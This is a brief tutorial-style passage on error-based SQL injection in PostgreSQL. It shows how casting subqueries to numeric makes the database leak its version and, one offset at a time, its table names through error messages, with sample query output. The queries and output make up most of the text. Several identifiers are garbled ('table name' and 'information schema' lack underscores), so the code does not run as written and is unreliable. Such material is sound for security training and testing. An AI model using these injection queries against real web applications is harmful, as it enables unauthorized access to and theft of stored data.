# postgreSQL Server

To exploit a SQLi on a web application using PostgreSQL, you have to leverage the cast technique we saw for MSSQL

You can use this technique to extract the DB version:

```text
# select cast(version() as numeric);

ERROR: invalid input syntax for type numeric: "PostgreSQL 9.1.15 on x86_64-unknown-linux-gnu, compiled by gg (Debian 4.7.2-5) 4.7.2, 64-bit"
```

Or the tables, by iterating over the information\_schema special database:

```text
dbname=# select cast ((select table name from information schema.tables limit 1 offset 0) as numeric); 
ERROR: invalid input syntax for type numeric: "pg_statistic"

dbname=# select cast ((select table name from information schema.tables limit 1 offset 1) as numeric); 
ERROR: invalid input syntax for type numeric: "pg_type"

dbname=# select cast ((select table name from information schema.tables limit 1 offset 2) as numeric); 
ERROR: invalid input syntax for type numeric: "pg_attribute"
```

